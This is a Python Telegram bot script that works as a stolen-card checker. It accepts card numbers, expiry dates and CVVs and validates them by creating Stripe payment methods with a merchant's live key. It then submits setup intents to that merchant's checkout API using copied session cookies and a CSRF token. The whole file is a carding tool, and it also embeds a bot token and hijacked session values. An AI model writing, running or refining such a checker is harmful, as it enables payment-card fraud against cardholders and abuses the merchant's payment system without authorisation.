import telebot
import requests
import re

BOT_TOKEN = '7194711538:AAHiP8JKzuhuJx72REyy6sMsRdttaPdvWAY'
bot = telebot.TeleBot(BOT_TOKEN)

def parse_card_input(text):
    match = re.match(r'(\d+)[/|](\d{2})[/|](\d{2,4})[/|](\d{3,4})', text)
    if not match:
        return None
        
    cc, mm, yy, cvv = match.groups()
    yy = yy[-2:]  # Convert YYYY to YY if needed
    return cc, mm, yy, cvv

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "Send card in format:\nCC|MM|YY|CVV\nCC|MM|YYYY|CVV")

@bot.message_handler(func=lambda m: True)
def check_card(message):
    card_data = parse_card_input(message.text)
    if not card_data:
        return bot.reply_to(message, "❌ Invalid format. Use: CC|MM|YY|CVV")
        
    cc, mm, yy, cvv = card_data
    
    # Step 1: Create Stripe payment method
    stripe_params = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': 'df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59',
        'muid': '6efd7584-fee8-409c-ba33-05d29099f4f5019d63',
        'sid': 'cfd57606-d22f-4f3f-b5f7-e2131ab32cf5b79697',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element',
        'referrer': 'https://www.bloomingriders.com',
        'time_on_page': '129736',
        'key': 'pk_live_pikg8Knzv9oPKaFnRwcld8xQ'
    }
    
    try:
        stripe_resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=stripe_params
        )
        stripe_data = stripe_resp.json()
        
        if 'error' in stripe_data:
            return bot.reply_to(message, f"❌ Stripe Error: {stripe_data['error']['message']}")
            
        pm_id = stripe_data['id']
    except Exception as e:
        return bot.reply_to(message, f"🔴 Stripe Connection Error: {str(e)}")
    
    # Step 2: Create Bloomingriders setup intent
    br_headers = {
        'x-csrf-token': 'I3tRBBIz-XqI1FLslr2bsea5YXKkHRJKKN2g',
        'x-country-code': 'IQ',
        'cookie': 'NEXT_LOCALE_V2=eyJtZXNzYWdlIjoiZGVmYXVsdCJ9; ruccd=s%3AeyJtZXNzYWdlIjoiSVEiLCJwdXJwb3NlIjoicnVjY2QifQ.l1Nc5QUSiaUxDqv9FSqzTLXC6u_LQNZbvLnFCfaShEA; swuid=s%3AeyJtZXNzYWdlIjoiY21hamxoOG80MDF2a2FrOW5kMnFwYjJ2ZCIsInB1cnBvc2UiOiJzd3VpZCJ9.ZZ8EZkLYw4jTun6GiWudxlUuL0xFSDMsbLijKZY0-Eo; __stripe_mid=6efd7584-fee8-409c-ba33-05d29099f4f5019d63; __stripe_sid=cfd57606-d22f-4f3f-b5f7-e2131ab32cf5b79697',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
    }
    
    br_json = {
        "stripe_payment_method_uuid": pm_id,
        "checkout_stat_id": 613838,
        "product_id": 1702,
        "product_type": "membership"
    }
    
    try:
        br_resp = requests.post(
            'https://www.bloomingriders.com/api/student/checkout/stripe/create-setup-intent',
            headers=br_headers,
            json=br_json
        )
        
        if br_resp.status_code == 200:
            bot.reply_to(message, "✅ Valid Card - Setup Intent Created")
        else:
            bot.reply_to(message, f"❌ Bloomingriders Error: {br_resp.text}")
    except Exception as e:
        bot.reply_to(message, f"🔴 Bloomingriders Connection Error: {str(e)}")

bot.polling()
